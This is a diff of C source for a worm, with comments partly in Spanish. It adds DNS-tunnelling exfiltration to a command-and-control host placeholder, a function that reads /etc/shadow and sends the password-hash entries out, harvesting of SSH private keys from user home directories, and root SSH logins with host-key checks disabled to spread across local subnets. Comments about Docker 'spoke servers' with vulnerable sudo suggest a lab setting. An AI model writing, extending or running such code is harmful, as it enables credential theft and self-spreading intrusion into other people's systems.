@@ -1,4 +1,4 @@
-#define _XOPEN_SOURCE 500
+#define _XOPEN_SOURCE 700
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -27,14 +27,256 @@
 #define SCAN_TIMEOUT 2
 #define SSH_TIMEOUT 10
 
+#define DNS_PORT 53
+#define BUF_SIZE 512
+#define MAX_LABEL 50
+#define C2_IP "c2"
+#define C2_DOMAIN "c2"
+
 char* SSH_KEY_PATH = NULL;
-char* SSH_USER = "bdsm";
+char* SSH_USER = "root";
 char* SSH_KEY_LIST[100];
 int SSH_KEY_COUNT = 0;
 char* local_ips[10];
 int local_ip_count = 0;
 char* unique_networks[10];
 int unique_network_count = 0;
+
+// DNS header (RFC 1035)
+struct dns_header {
+    uint16_t id;
+    uint16_t flags;
+    uint16_t qdcount;
+    uint16_t ancount;
+    uint16_t nscount;
+    uint16_t arcount;
+};
+
+// Convierte "hola.ejemplo.com" -> formato DNS
+int encode_qname(unsigned char *buf, const char *host) {
+    int pos = 0;
+    const char *beg = host;
+    const char *p = host;
+
+    while (*p) {
+        if (*p == '.') {
+            buf[pos++] = p - beg;
+            memcpy(&buf[pos], beg, p - beg);
+            pos += p - beg;
+            beg = p + 1;
+        }
+        p++;
+    }
+
+    buf[pos++] = p - beg;
+    memcpy(&buf[pos], beg, p - beg);
+    pos += p - beg;
+    buf[pos++] = 0; // fin del QNAME
+
+    return pos;
+}
+
+// Base64 URL-safe encoding
+void base64_encode_urlsafe(const unsigned char *input, int len, char *output) {
+    const char *table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+    int i, j;
+    
+    for (i = 0, j = 0; i < len;) {
+        uint32_t octet_a = i < len ? input[i++] : 0;
+        uint32_t octet_b = i < len ? input[i++] : 0;
+        uint32_t octet_c = i < len ? input[i++] : 0;
+        
+        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
+        
+        output[j++] = table[(triple >> 3 * 6) & 0x3F];
+        output[j++] = table[(triple >> 2 * 6) & 0x3F];
+        output[j++] = table[(triple >> 1 * 6) & 0x3F];
+        output[j++] = table[(triple >> 0 * 6) & 0x3F];
+    }
+    
+    int mod = len % 3;
+    if (mod == 1) {
+        j -= 2; // Remove last 2 chars
+    } else if (mod == 2) {
+        j -= 1; // Remove last 1 char
+    }
+    
+    output[j] = '\0';
+}
+
+// Envía una query DNS
+void send_dns_query(int sock, struct sockaddr_in *dest, const char *hostname) {
+    unsigned char buf[BUF_SIZE];
+    struct dns_header *dns;
+    int qname_len;
+
+    memset(buf, 0, BUF_SIZE);
+
+    dns = (struct dns_header *) buf;
+    dns->id = htons(rand() % 0xFFFF);
+    dns->flags = htons(0x0100);
+    dns->qdcount = htons(1);
+
+    qname_len = encode_qname(buf + sizeof(struct dns_header), hostname);
+
+    uint16_t *qtype = (uint16_t *)(buf + sizeof(struct dns_header) + qname_len);
+    *qtype = htons(1); // A
+
+    uint16_t *qclass = qtype + 1;
+    *qclass = htons(1); // IN
+
+    int packet_len = sizeof(struct dns_header) + qname_len + 4;
+
+    sendto(sock, buf, packet_len, 0, (struct sockaddr *)dest, sizeof(*dest));
+}
+
+// Exfiltra mensaje por DNS
+void exfiltrate(const char *message, const char *c2_ip, const char *domain) {
+    printf("[*] Iniciando exfiltración DNS a %s...", c2_ip);
+    int sock;
+    struct sockaddr_in dest;
+    // Base64 is 4/3 expansion.
+    char *encoded = malloc(strlen(message) * 2 + 1); 
+    if (!encoded) return;
+    
+    char session[16];
+    char hostname[256];
+    int len = strlen(message);
+
+    // Generar ID de sesión
+    unsigned long r;
+    srand(time(NULL));         // Inicializa el generador de números aleatorios
+    r = rand();                // Genera un número pseudoaleatorio
+    snprintf(session, sizeof(session), "%lx", r);
+
+    // Codificar mensaje en base64 url-safe
+    base64_encode_urlsafe((const unsigned char*)message, len, encoded);
+
+    // Resolver nombre/IP del C2
+    struct addrinfo hints, *res;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_DGRAM;
+    
+    if (getaddrinfo(c2_ip, NULL, &hints, &res) != 0) {
+        fprintf(stderr, "[!] Error resolviendo %s\n", c2_ip);
+        free(encoded);
+        return;
+    }
+
+    // Socket UDP
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(DNS_PORT);
+    dest.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
+    
+    freeaddrinfo(res);
+
+    // Dividir en fragmentos
+    int seq = 0;
+    int total_len = strlen(encoded);
+    int pos = 0;
+
+    while (pos < total_len) {
+        int chunk_size = (total_len - pos > MAX_LABEL) ? MAX_LABEL : (total_len - pos);
+        char chunk[MAX_LABEL + 1];
+        
+        strncpy(chunk, encoded + pos, chunk_size);
+        chunk[chunk_size] = '\0';
+
+        snprintf(hostname, sizeof(hostname), "%s.%d.%s.%s", session, seq, chunk, domain);
+        
+        printf("[DNS] Enviando fragmento %d: %s\n", seq, hostname);
+        send_dns_query(sock, &dest, hostname);
+        
+        usleep(100000); // 100ms delay
+        pos += chunk_size;
+        seq++;
+    }
+
+    // Enviar señal END
+    snprintf(hostname, sizeof(hostname), "%s.END.X.%s", session, domain);
+    printf("[DNS] Enviando END: %s\n", hostname);
+    send_dns_query(sock, &dest, hostname);
+
+    close(sock);
+    free(encoded);
+    printf("[+] Exfiltración DNS completada");
+}
+
+void steal_shadow() {
+    printf("[*] Attempting to steal /etc/shadow...\n");
+    FILE* f = fopen("/etc/shadow", "r");
+    if (!f) {
+        printf("[-] Failed to open /etc/shadow: %s\n", strerror(errno));
+        return;
+    }
+    
+    // Read entire file into memory (limit 10KB for safety)
+    char *buffer = malloc(10240);
+    if (!buffer) {
+        fclose(f);
+        return;
+    }
+    
+    size_t bytes_read = fread(buffer, 1, 10240 - 1, f);
+    buffer[bytes_read] = '\0';
+    fclose(f);
+    
+    if (bytes_read > 0) {
+        // Filter lines: skip if second field (after first ':') has length <= 1
+        char *filtered = malloc(10240);
+        if (!filtered) {
+            free(buffer);
+            return;
+        }
+        
+        char *line = strtok(buffer, "\n");
+        size_t filtered_len = 0;
+        
+        while (line != NULL) {
+            char *first_colon = strchr(line, ':');
+            if (first_colon) {
+                char *second_colon = strchr(first_colon + 1, ':');
+                size_t second_field_len;
+                
+                if (second_colon) {
+                    second_field_len = second_colon - (first_colon + 1);
+                } else {
+                    second_field_len = strlen(first_colon + 1);
+                }
+                
+                // Only include lines where second field length > 1
+                if (second_field_len > 1) {
+                    size_t line_len = strlen(line);
+                    if (filtered_len + line_len + 1 < 10240) {
+                        strcpy(filtered + filtered_len, line);
+                        filtered_len += line_len;
+                        filtered[filtered_len++] = '\n';
+                    }
+                }
+            }
+            
+            line = strtok(NULL, "\n");
+        }
+        
+        filtered[filtered_len] = '\0';
+        
+        if (filtered_len > 0) {
+            printf("[*] Sending %zu bytes of filtered shadow file...\n", filtered_len);
+            exfiltrate(filtered, C2_IP, C2_DOMAIN);
+            printf("[+] Shadow file exfiltration completed\n");
+        } else {
+            printf("[-] No valid entries found in /etc/shadow.\n");
+        }
+        
+        free(filtered);
+    } else {
+        printf("[-] /etc/shadow is empty or could not be read.\n");
+    }
+    
+    free(buffer);
+}
 
 // Base64 encoding table
 static const char base64_table[] = 
@@ -198,19 +440,27 @@ char* get_executable_path(const char* argv0) {
     return NULL;
 }
 
-
-
-
-
-
 /**
  * Read SSH private keys from user home directories .ssh/id_rsa
  * Stores found keys in global lists for later testing
  * Returns the number of keys found
  */
 int read_ssh_key() {
+    // First, try current user's HOME directory
+    char* home = getenv("HOME");
+    if (home) {
+        char key_path[MAX_PATH_LEN];
+        snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", home);
+        
+        if (access(key_path, R_OK) == 0) {
+            SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);
+            SSH_KEY_COUNT++;
+        }
+    }
+    
+    // Then scan all /home directories
     DIR* home_dir = opendir("/home");
-    if (!home_dir) return 0;
+    if (!home_dir) return SSH_KEY_COUNT;
     
     struct dirent* entry;
     while ((entry = readdir(home_dir)) != NULL) {
@@ -225,24 +475,26 @@ int read_ssh_key() {
             snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", user_path);
             
             if (access(key_path, R_OK) == 0) {
-                SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);                
-                SSH_KEY_COUNT++;
-                if (SSH_KEY_COUNT >= 100) break;
+                // Check if already added (avoid duplicates)
+                int duplicate = 0;
+                for (int i = 0; i < SSH_KEY_COUNT; i++) {
+                    if (strcmp(SSH_KEY_LIST[i], key_path) == 0) {
+                        duplicate = 1;
+                        break;
+                    }
+                }
+                
+                if (!duplicate) {
+                    SSH_KEY_LIST[SSH_KEY_COUNT] = strdup(key_path);                
+                    SSH_KEY_COUNT++;
+                    if (SSH_KEY_COUNT >= 100) break;
+                }
             }
         }
     }
     closedir(home_dir);
     return SSH_KEY_COUNT;
 }
-
-
-
-
-
-
-
-
-
 
 /**
  * Scan target IP for port 22 (SSH)
@@ -328,7 +580,7 @@ int infect_target(const char* ip, const char* argv0) {
         char ssh_cmd[4096];
         snprintf(ssh_cmd, sizeof(ssh_cmd),
             "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
-            "-i %s %s@%s 'echo test' 2>/dev/null",
+            "-i %s %s@%s 'true' >/dev/null 2>&1",
             SSH_TIMEOUT, SSH_KEY_LIST[i], SSH_USER, ip);
         
         int result = system(ssh_cmd);
@@ -365,7 +617,7 @@ int infect_target(const char* ip, const char* argv0) {
     fseek(f, 0, SEEK_END);
     long file_size_long = ftell(f);
     fseek(f, 0, SEEK_SET);
-    
+
     if (file_size_long < 0) {
         printf("[-] Error getting file size\n");
         fclose(f);
@@ -480,6 +732,8 @@ int infect_target(const char* ip, const char* argv0) {
     return 1;
 }
 
+
+
 void get_net_24(const char *ip, char *out) {
     strcpy(out, ip);
     char *last_dot = strrchr(out, '.');
@@ -498,7 +752,18 @@ int main(int argc, char* argv[]) {
     
     // Delay to allow system to settle if just started
     sleep(2);
-    
+
+    // PHASE 1: Priviledge escalation
+
+    // Attempt privilege escalation on spoke servers (before SSH key check)
+    // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
+    // This works better than hostname checking since Docker containers have random hostnames
+
+
+    //PHASE 2: Data exfiltration and infection
+    printf("\n[*] Phase 2: Data Exfiltration\n");
+    steal_shadow();
+
     // Check if SSH keys exist
     int keys_found = read_ssh_key();
     if (keys_found == 0) {
@@ -561,6 +826,6 @@ int main(int argc, char* argv[]) {
                 infect_target(ip, argv[0]);
             }
         }
+    sleep(30);
     return 0;
 }
-
